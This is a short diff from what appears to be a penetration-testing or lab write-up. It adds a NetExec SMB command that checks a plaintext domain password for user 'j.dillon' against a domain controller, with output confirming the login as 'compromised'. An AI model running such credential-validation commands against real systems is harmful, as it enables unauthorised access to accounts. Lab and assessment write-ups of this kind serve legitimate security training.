@@ -682,5 +682,9 @@ j.dillon:novafire2008
 Ill validate these credentials
 
 ```python
-
+nxc smb dc.novacart.local -u j.dillon -p 'novafire2008'       
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\j.dillon:novafire2008
 ```
+This user is compromised!
+
